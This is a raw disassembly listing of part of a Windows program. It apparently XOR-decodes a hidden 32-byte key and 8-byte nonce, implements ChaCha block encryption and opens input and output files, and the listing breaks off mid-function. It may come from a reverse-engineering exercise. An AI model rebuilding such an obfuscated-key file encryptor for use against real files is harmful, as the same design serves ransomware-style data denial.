   140001726:	48 8b 5d f0          	mov    -0x10(%rbp),%rbx
   14000172a:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000172f:	48 8b 05 ba 99 00 00 	mov    0x99ba(%rip),%rax        # 0x14000b0f0
   140001736:	ff d0                	call   *%rax
   140001738:	48 89 c1             	mov    %rax,%rcx
   14000173b:	48 8b 45 20          	mov    0x20(%rbp),%rax
   14000173f:	49 89 d8             	mov    %rbx,%r8
   140001742:	48 89 c2             	mov    %rax,%rdx
   140001745:	e8 36 23 00 00       	call   0x140003a80
   14000174a:	89 45 fc             	mov    %eax,-0x4(%rbp)
   14000174d:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140001750:	48 83 c4 38          	add    $0x38,%rsp
   140001754:	5b                   	pop    %rbx
   140001755:	5d                   	pop    %rbp
   140001756:	c3                   	ret
   140001757:	55                   	push   %rbp
   140001758:	48 89 e5             	mov    %rsp,%rbp
   14000175b:	48 83 ec 30          	sub    $0x30,%rsp
   14000175f:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140001763:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140001767:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   14000176b:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
   14000176f:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140001773:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140001777:	4c 8b 45 f0          	mov    -0x10(%rbp),%r8
   14000177b:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   14000177f:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140001783:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001787:	4d 89 c1             	mov    %r8,%r9
   14000178a:	49 89 c8             	mov    %rcx,%r8
   14000178d:	48 89 c1             	mov    %rax,%rcx
   140001790:	e8 5b 23 00 00       	call   0x140003af0
   140001795:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140001798:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000179b:	48 83 c4 30          	add    $0x30,%rsp
   14000179f:	5d                   	pop    %rbp
   1400017a0:	c3                   	ret
   1400017a1:	55                   	push   %rbp
   1400017a2:	48 89 e5             	mov    %rsp,%rbp
   1400017a5:	48 83 ec 10          	sub    $0x10,%rsp
   1400017a9:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   1400017ad:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   1400017b4:	eb 35                	jmp    0x1400017eb
   1400017b6:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400017b9:	48 98                	cltq
   1400017bb:	48 8d 15 9e a8 00 00 	lea    0xa89e(%rip),%rdx        # 0x14000c060
   1400017c2:	0f b6 04 10          	movzbl (%rax,%rdx,1),%eax
   1400017c6:	ba 42 00 00 00       	mov    $0x42,%edx
   1400017cb:	31 d0                	xor    %edx,%eax
   1400017cd:	89 c2                	mov    %eax,%edx
   1400017cf:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400017d2:	89 d1                	mov    %edx,%ecx
   1400017d4:	31 c1                	xor    %eax,%ecx
   1400017d6:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400017d9:	48 63 d0             	movslq %eax,%rdx
   1400017dc:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400017e0:	48 01 d0             	add    %rdx,%rax
   1400017e3:	89 ca                	mov    %ecx,%edx
   1400017e5:	88 10                	mov    %dl,(%rax)
   1400017e7:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   1400017eb:	83 7d fc 1f          	cmpl   $0x1f,-0x4(%rbp)
   1400017ef:	7e c5                	jle    0x1400017b6
   1400017f1:	90                   	nop
   1400017f2:	90                   	nop
   1400017f3:	48 83 c4 10          	add    $0x10,%rsp
   1400017f7:	5d                   	pop    %rbp
   1400017f8:	c3                   	ret
   1400017f9:	55                   	push   %rbp
   1400017fa:	48 89 e5             	mov    %rsp,%rbp
   1400017fd:	48 83 ec 10          	sub    $0x10,%rsp
   140001801:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140001805:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   14000180c:	eb 3b                	jmp    0x140001849
   14000180e:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140001811:	48 98                	cltq
   140001813:	48 8d 15 66 a8 00 00 	lea    0xa866(%rip),%rdx        # 0x14000c080
   14000181a:	0f b6 04 10          	movzbl (%rax,%rdx,1),%eax
   14000181e:	ba 42 00 00 00       	mov    $0x42,%edx
   140001823:	31 d0                	xor    %edx,%eax
   140001825:	89 c1                	mov    %eax,%ecx
   140001827:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000182a:	89 c2                	mov    %eax,%edx
   14000182c:	89 d0                	mov    %edx,%eax
   14000182e:	01 c0                	add    %eax,%eax
   140001830:	01 d0                	add    %edx,%eax
   140001832:	31 c1                	xor    %eax,%ecx
   140001834:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140001837:	48 63 d0             	movslq %eax,%rdx
   14000183a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000183e:	48 01 d0             	add    %rdx,%rax
   140001841:	89 ca                	mov    %ecx,%edx
   140001843:	88 10                	mov    %dl,(%rax)
   140001845:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   140001849:	83 7d fc 07          	cmpl   $0x7,-0x4(%rbp)
   14000184d:	7e bf                	jle    0x14000180e
   14000184f:	90                   	nop
   140001850:	90                   	nop
   140001851:	48 83 c4 10          	add    $0x10,%rsp
   140001855:	5d                   	pop    %rbp
   140001856:	c3                   	ret
   140001857:	55                   	push   %rbp
   140001858:	48 89 e5             	mov    %rsp,%rbp
   14000185b:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000185f:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001863:	0f b6 00             	movzbl (%rax),%eax
   140001866:	0f b6 c0             	movzbl %al,%eax
   140001869:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000186d:	48 83 c2 01          	add    $0x1,%rdx
   140001871:	0f b6 12             	movzbl (%rdx),%edx
   140001874:	0f b6 d2             	movzbl %dl,%edx
   140001877:	c1 e2 08             	shl    $0x8,%edx
   14000187a:	09 c2                	or     %eax,%edx
   14000187c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001880:	48 83 c0 02          	add    $0x2,%rax
   140001884:	0f b6 00             	movzbl (%rax),%eax
   140001887:	0f b6 c0             	movzbl %al,%eax
   14000188a:	c1 e0 10             	shl    $0x10,%eax
   14000188d:	09 c2                	or     %eax,%edx
   14000188f:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001893:	48 83 c0 03          	add    $0x3,%rax
   140001897:	0f b6 00             	movzbl (%rax),%eax
   14000189a:	0f b6 c0             	movzbl %al,%eax
   14000189d:	c1 e0 18             	shl    $0x18,%eax
   1400018a0:	09 d0                	or     %edx,%eax
   1400018a2:	5d                   	pop    %rbp
   1400018a3:	c3                   	ret
   1400018a4:	55                   	push   %rbp
   1400018a5:	48 89 e5             	mov    %rsp,%rbp
   1400018a8:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   1400018ac:	89 55 18             	mov    %edx,0x18(%rbp)
   1400018af:	8b 45 18             	mov    0x18(%rbp),%eax
   1400018b2:	89 c2                	mov    %eax,%edx
   1400018b4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400018b8:	88 10                	mov    %dl,(%rax)
   1400018ba:	8b 45 18             	mov    0x18(%rbp),%eax
   1400018bd:	c1 e8 08             	shr    $0x8,%eax
   1400018c0:	89 c2                	mov    %eax,%edx
   1400018c2:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400018c6:	48 83 c0 01          	add    $0x1,%rax
   1400018ca:	88 10                	mov    %dl,(%rax)
   1400018cc:	8b 45 18             	mov    0x18(%rbp),%eax
   1400018cf:	c1 e8 10             	shr    $0x10,%eax
   1400018d2:	89 c2                	mov    %eax,%edx
   1400018d4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400018d8:	48 83 c0 02          	add    $0x2,%rax
   1400018dc:	88 10                	mov    %dl,(%rax)
   1400018de:	8b 45 18             	mov    0x18(%rbp),%eax
   1400018e1:	c1 e8 18             	shr    $0x18,%eax
   1400018e4:	89 c2                	mov    %eax,%edx
   1400018e6:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400018ea:	48 83 c0 03          	add    $0x3,%rax
   1400018ee:	88 10                	mov    %dl,(%rax)
   1400018f0:	90                   	nop
   1400018f1:	5d                   	pop    %rbp
   1400018f2:	c3                   	ret
   1400018f3:	55                   	push   %rbp
   1400018f4:	48 89 e5             	mov    %rsp,%rbp
   1400018f7:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   1400018fb:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   1400018ff:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140001903:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
   140001907:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000190b:	8b 10                	mov    (%rax),%edx
   14000190d:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140001911:	8b 00                	mov    (%rax),%eax
   140001913:	01 c2                	add    %eax,%edx
   140001915:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001919:	89 10                	mov    %edx,(%rax)
   14000191b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000191f:	8b 10                	mov    (%rax),%edx
   140001921:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001925:	8b 00                	mov    (%rax),%eax
   140001927:	31 c2                	xor    %eax,%edx
   140001929:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000192d:	89 10                	mov    %edx,(%rax)
   14000192f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140001933:	8b 00                	mov    (%rax),%eax
   140001935:	c1 c0 10             	rol    $0x10,%eax
   140001938:	89 c2                	mov    %eax,%edx
   14000193a:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000193e:	89 10                	mov    %edx,(%rax)
   140001940:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140001944:	8b 10                	mov    (%rax),%edx
   140001946:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000194a:	8b 00                	mov    (%rax),%eax
   14000194c:	01 c2                	add    %eax,%edx
   14000194e:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140001952:	89 10                	mov    %edx,(%rax)
   140001954:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140001958:	8b 10                	mov    (%rax),%edx
   14000195a:	48 8b 45 20          	mov    0x20(%rbp),%rax
   14000195e:	8b 00                	mov    (%rax),%eax
   140001960:	31 c2                	xor    %eax,%edx
   140001962:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140001966:	89 10                	mov    %edx,(%rax)
   140001968:	48 8b 45 18          	mov    0x18(%rbp),%rax
   14000196c:	8b 00                	mov    (%rax),%eax
   14000196e:	c1 c0 0c             	rol    $0xc,%eax
   140001971:	89 c2                	mov    %eax,%edx
   140001973:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140001977:	89 10                	mov    %edx,(%rax)
   140001979:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000197d:	8b 10                	mov    (%rax),%edx
   14000197f:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140001983:	8b 00                	mov    (%rax),%eax
   140001985:	01 c2                	add    %eax,%edx
   140001987:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000198b:	89 10                	mov    %edx,(%rax)
   14000198d:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140001991:	8b 10                	mov    (%rax),%edx
   140001993:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140001997:	8b 00                	mov    (%rax),%eax
   140001999:	31 c2                	xor    %eax,%edx
   14000199b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000199f:	89 10                	mov    %edx,(%rax)
   1400019a1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400019a5:	8b 00                	mov    (%rax),%eax
   1400019a7:	c1 c0 08             	rol    $0x8,%eax
   1400019aa:	89 c2                	mov    %eax,%edx
   1400019ac:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400019b0:	89 10                	mov    %edx,(%rax)
   1400019b2:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400019b6:	8b 10                	mov    (%rax),%edx
   1400019b8:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400019bc:	8b 00                	mov    (%rax),%eax
   1400019be:	01 c2                	add    %eax,%edx
   1400019c0:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400019c4:	89 10                	mov    %edx,(%rax)
   1400019c6:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400019ca:	8b 10                	mov    (%rax),%edx
   1400019cc:	48 8b 45 20          	mov    0x20(%rbp),%rax
   1400019d0:	8b 00                	mov    (%rax),%eax
   1400019d2:	31 c2                	xor    %eax,%edx
   1400019d4:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400019d8:	89 10                	mov    %edx,(%rax)
   1400019da:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400019de:	8b 00                	mov    (%rax),%eax
   1400019e0:	c1 c0 07             	rol    $0x7,%eax
   1400019e3:	89 c2                	mov    %eax,%edx
   1400019e5:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400019e9:	89 10                	mov    %edx,(%rax)
   1400019eb:	90                   	nop
   1400019ec:	5d                   	pop    %rbp
   1400019ed:	c3                   	ret
   1400019ee:	55                   	push   %rbp
   1400019ef:	53                   	push   %rbx
   1400019f0:	48 81 ec c8 00 00 00 	sub    $0xc8,%rsp
   1400019f7:	48 8d ac 24 c0 00 00 	lea    0xc0(%rsp),%rbp
   1400019fe:	00 
   1400019ff:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   140001a03:	89 55 28             	mov    %edx,0x28(%rbp)
   140001a06:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140001a0a:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   140001a0e:	48 8d 05 74 a6 00 00 	lea    0xa674(%rip),%rax        # 0x14000c089
   140001a15:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140001a19:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001a1d:	48 89 c1             	mov    %rax,%rcx
   140001a20:	e8 32 fe ff ff       	call   0x140001857
   140001a25:	89 45 a0             	mov    %eax,-0x60(%rbp)
   140001a28:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001a2c:	48 83 c0 04          	add    $0x4,%rax
   140001a30:	48 89 c1             	mov    %rax,%rcx
   140001a33:	e8 1f fe ff ff       	call   0x140001857
   140001a38:	89 45 a4             	mov    %eax,-0x5c(%rbp)
   140001a3b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001a3f:	48 83 c0 08          	add    $0x8,%rax
   140001a43:	48 89 c1             	mov    %rax,%rcx
   140001a46:	e8 0c fe ff ff       	call   0x140001857
   140001a4b:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140001a4e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001a52:	48 83 c0 0c          	add    $0xc,%rax
   140001a56:	48 89 c1             	mov    %rax,%rcx
   140001a59:	e8 f9 fd ff ff       	call   0x140001857
   140001a5e:	89 45 ac             	mov    %eax,-0x54(%rbp)
   140001a61:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   140001a68:	eb 29                	jmp    0x140001a93
   140001a6a:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140001a6d:	c1 e0 02             	shl    $0x2,%eax
   140001a70:	48 63 d0             	movslq %eax,%rdx
   140001a73:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140001a77:	48 01 d0             	add    %rdx,%rax
   140001a7a:	8b 55 fc             	mov    -0x4(%rbp),%edx
   140001a7d:	8d 5a 04             	lea    0x4(%rdx),%ebx
   140001a80:	48 89 c1             	mov    %rax,%rcx
   140001a83:	e8 cf fd ff ff       	call   0x140001857
   140001a88:	48 63 d3             	movslq %ebx,%rdx
   140001a8b:	89 44 95 a0          	mov    %eax,-0x60(%rbp,%rdx,4)
   140001a8f:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   140001a93:	83 7d fc 07          	cmpl   $0x7,-0x4(%rbp)
   140001a97:	7e d1                	jle    0x140001a6a
   140001a99:	8b 45 28             	mov    0x28(%rbp),%eax
   140001a9c:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140001a9f:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140001aa3:	48 89 c1             	mov    %rax,%rcx
   140001aa6:	e8 ac fd ff ff       	call   0x140001857
   140001aab:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   140001aae:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140001ab2:	48 83 c0 04          	add    $0x4,%rax
   140001ab6:	48 89 c1             	mov    %rax,%rcx
   140001ab9:	e8 99 fd ff ff       	call   0x140001857
   140001abe:	89 45 d8             	mov    %eax,-0x28(%rbp)
   140001ac1:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
   140001ac8:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
   140001acf:	eb 19                	jmp    0x140001aea
   140001ad1:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140001ad4:	48 98                	cltq
   140001ad6:	8b 54 85 a0          	mov    -0x60(%rbp,%rax,4),%edx
   140001ada:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140001add:	48 98                	cltq
   140001adf:	89 94 85 60 ff ff ff 	mov    %edx,-0xa0(%rbp,%rax,4)
   140001ae6:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
   140001aea:	83 7d f8 0f          	cmpl   $0xf,-0x8(%rbp)
   140001aee:	7e e1                	jle    0x140001ad1
   140001af0:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
   140001af7:	e9 cc 01 00 00       	jmp    0x140001cc8
   140001afc:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b03:	4c 8d 40 30          	lea    0x30(%rax),%r8
   140001b07:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b0e:	48 8d 48 20          	lea    0x20(%rax),%rcx
   140001b12:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b19:	48 8d 50 10          	lea    0x10(%rax),%rdx
   140001b1d:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b24:	4d 89 c1             	mov    %r8,%r9
   140001b27:	49 89 c8             	mov    %rcx,%r8
   140001b2a:	48 89 c1             	mov    %rax,%rcx
   140001b2d:	e8 c1 fd ff ff       	call   0x1400018f3
   140001b32:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b39:	4c 8d 40 34          	lea    0x34(%rax),%r8
   140001b3d:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b44:	48 8d 48 24          	lea    0x24(%rax),%rcx
   140001b48:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b4f:	48 8d 50 14          	lea    0x14(%rax),%rdx
   140001b53:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b5a:	48 83 c0 04          	add    $0x4,%rax
   140001b5e:	4d 89 c1             	mov    %r8,%r9
   140001b61:	49 89 c8             	mov    %rcx,%r8
   140001b64:	48 89 c1             	mov    %rax,%rcx
   140001b67:	e8 87 fd ff ff       	call   0x1400018f3
   140001b6c:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b73:	4c 8d 40 38          	lea    0x38(%rax),%r8
   140001b77:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b7e:	48 8d 48 28          	lea    0x28(%rax),%rcx
   140001b82:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b89:	48 8d 50 18          	lea    0x18(%rax),%rdx
   140001b8d:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001b94:	48 83 c0 08          	add    $0x8,%rax
   140001b98:	4d 89 c1             	mov    %r8,%r9
   140001b9b:	49 89 c8             	mov    %rcx,%r8
   140001b9e:	48 89 c1             	mov    %rax,%rcx
   140001ba1:	e8 4d fd ff ff       	call   0x1400018f3
   140001ba6:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001bad:	4c 8d 40 3c          	lea    0x3c(%rax),%r8
   140001bb1:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001bb8:	48 8d 48 2c          	lea    0x2c(%rax),%rcx
   140001bbc:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001bc3:	48 8d 50 1c          	lea    0x1c(%rax),%rdx
   140001bc7:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001bce:	48 83 c0 0c          	add    $0xc,%rax
   140001bd2:	4d 89 c1             	mov    %r8,%r9
   140001bd5:	49 89 c8             	mov    %rcx,%r8
   140001bd8:	48 89 c1             	mov    %rax,%rcx
   140001bdb:	e8 13 fd ff ff       	call   0x1400018f3
   140001be0:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001be7:	4c 8d 40 3c          	lea    0x3c(%rax),%r8
   140001beb:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001bf2:	48 8d 48 28          	lea    0x28(%rax),%rcx
   140001bf6:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001bfd:	48 8d 50 14          	lea    0x14(%rax),%rdx
   140001c01:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001c08:	4d 89 c1             	mov    %r8,%r9
   140001c0b:	49 89 c8             	mov    %rcx,%r8
   140001c0e:	48 89 c1             	mov    %rax,%rcx
   140001c11:	e8 dd fc ff ff       	call   0x1400018f3
   140001c16:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001c1d:	4c 8d 40 30          	lea    0x30(%rax),%r8
   140001c21:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001c28:	48 8d 48 2c          	lea    0x2c(%rax),%rcx
   140001c2c:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001c33:	48 8d 50 18          	lea    0x18(%rax),%rdx
   140001c37:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001c3e:	48 83 c0 04          	add    $0x4,%rax
   140001c42:	4d 89 c1             	mov    %r8,%r9
   140001c45:	49 89 c8             	mov    %rcx,%r8
   140001c48:	48 89 c1             	mov    %rax,%rcx
   140001c4b:	e8 a3 fc ff ff       	call   0x1400018f3
   140001c50:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001c57:	4c 8d 40 34          	lea    0x34(%rax),%r8
   140001c5b:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001c62:	48 8d 48 20          	lea    0x20(%rax),%rcx
   140001c66:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001c6d:	48 8d 50 1c          	lea    0x1c(%rax),%rdx
   140001c71:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001c78:	48 83 c0 08          	add    $0x8,%rax
   140001c7c:	4d 89 c1             	mov    %r8,%r9
   140001c7f:	49 89 c8             	mov    %rcx,%r8
   140001c82:	48 89 c1             	mov    %rax,%rcx
   140001c85:	e8 69 fc ff ff       	call   0x1400018f3
   140001c8a:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001c91:	4c 8d 40 38          	lea    0x38(%rax),%r8
   140001c95:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001c9c:	48 8d 48 24          	lea    0x24(%rax),%rcx
   140001ca0:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001ca7:	48 8d 50 10          	lea    0x10(%rax),%rdx
   140001cab:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   140001cb2:	48 83 c0 0c          	add    $0xc,%rax
   140001cb6:	4d 89 c1             	mov    %r8,%r9
   140001cb9:	49 89 c8             	mov    %rcx,%r8
   140001cbc:	48 89 c1             	mov    %rax,%rcx
   140001cbf:	e8 2f fc ff ff       	call   0x1400018f3
   140001cc4:	83 45 f4 02          	addl   $0x2,-0xc(%rbp)
   140001cc8:	83 7d f4 07          	cmpl   $0x7,-0xc(%rbp)
   140001ccc:	0f 8e 2a fe ff ff    	jle    0x140001afc
   140001cd2:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
   140001cd9:	eb 39                	jmp    0x140001d14
   140001cdb:	8b 45 f0             	mov    -0x10(%rbp),%eax
   140001cde:	48 98                	cltq
   140001ce0:	8b 94 85 60 ff ff ff 	mov    -0xa0(%rbp,%rax,4),%edx
   140001ce7:	8b 45 f0             	mov    -0x10(%rbp),%eax
   140001cea:	48 98                	cltq
   140001cec:	8b 44 85 a0          	mov    -0x60(%rbp,%rax,4),%eax
   140001cf0:	01 d0                	add    %edx,%eax
   140001cf2:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140001cf5:	8b 45 f0             	mov    -0x10(%rbp),%eax
   140001cf8:	c1 e0 02             	shl    $0x2,%eax
   140001cfb:	48 63 d0             	movslq %eax,%rdx
   140001cfe:	48 8b 45 38          	mov    0x38(%rbp),%rax
   140001d02:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
   140001d06:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140001d09:	89 c2                	mov    %eax,%edx
   140001d0b:	e8 94 fb ff ff       	call   0x1400018a4
   140001d10:	83 45 f0 01          	addl   $0x1,-0x10(%rbp)
   140001d14:	83 7d f0 0f          	cmpl   $0xf,-0x10(%rbp)
   140001d18:	7e c1                	jle    0x140001cdb
   140001d1a:	90                   	nop
   140001d1b:	90                   	nop
   140001d1c:	48 81 c4 c8 00 00 00 	add    $0xc8,%rsp
   140001d23:	5b                   	pop    %rbx
   140001d24:	5d                   	pop    %rbp
   140001d25:	c3                   	ret
   140001d26:	55                   	push   %rbp
   140001d27:	53                   	push   %rbx
   140001d28:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
   140001d2f:	48 8d ac 24 d0 00 00 	lea    0xd0(%rsp),%rbp
   140001d36:	00 
   140001d37:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   140001d3b:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   140001d3f:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140001d43:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   140001d47:	48 8d 15 4c a3 00 00 	lea    0xa34c(%rip),%rdx        # 0x14000c09a
   140001d4e:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140001d52:	48 89 c1             	mov    %rax,%rcx
   140001d55:	e8 5e 83 00 00       	call   0x14000a0b8
   140001d5a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140001d5e:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
   140001d63:	75 49                	jne    0x140001dae
   140001d65:	48 8b 05 f4 05 01 00 	mov    0x105f4(%rip),%rax        # 0x140012360
   140001d6c:	ff d0                	call   *%rax
   140001d6e:	8b 00                	mov    (%rax),%eax
   140001d70:	89 c1                	mov    %eax,%ecx
   140001d72:	e8 a9 83 00 00       	call   0x14000a120
   140001d77:	48 89 c3             	mov    %rax,%rbx
   140001d7a:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001d7f:	48 8b 05 6a 93 00 00 	mov    0x936a(%rip),%rax        # 0x14000b0f0
   140001d86:	ff d0                	call   *%rax
   140001d88:	48 89 c1             	mov    %rax,%rcx
   140001d8b:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001d8f:	48 8d 05 0a a3 00 00 	lea    0xa30a(%rip),%rax        # 0x14000c0a0
   140001d96:	49 89 d9             	mov    %rbx,%r9
   140001d99:	49 89 d0             	mov    %rdx,%r8
   140001d9c:	48 89 c2             	mov    %rax,%rdx
   140001d9f:	e8 1c f9 ff ff       	call   0x1400016c0
   140001da4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001da9:	e9 a3 01 00 00       	jmp    0x140001f51
   140001dae:	48 8d 15 0c a3 00 00 	lea    0xa30c(%rip),%rdx        # 0x14000c0c1
   140001db5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140001db9:	48 89 c1             	mov    %rax,%rcx
   140001dbc:	e8 f7 82 00 00       	call   0x14000a0b8
   140001dc1:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140001dc5:	48 83 7d e0 00       	cmpq   $0x0,-0x20(%rbp)
   140001dca:	75 55                	jne    0x140001e21
   140001dcc:	48 8b 05 8d 05 01 00 	mov    0x1058d(%rip),%rax        # 0x140012360
   140001dd3:	ff d0                	call   *%rax
   140001dd5:	8b 00                	mov    (%rax),%eax
   140001dd7:	89 c1                	mov    %eax,%ecx
   140001dd9:	e8 42 83 00 00       	call   0x14000a120
   140001dde:	48 89 c3             	mov    %rax,%rbx
   140001de1:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001de6:	48 8b 05 03 93 00 00 	mov    0x9303(%rip),%rax        # 0x14000b0f0
   140001ded:	ff d0                	call   *%rax
   140001def:	48 89 c1             	mov    %rax,%rcx
   140001df2:	48 8b 55 28          	mov    0x28(%rbp),%rdx
   140001df6:	48 8d 05 cb a2 00 00 	lea    0xa2cb(%rip),%rax        # 0x14000c0c8
   140001dfd:	49 89 d9             	mov    %rbx,%r9
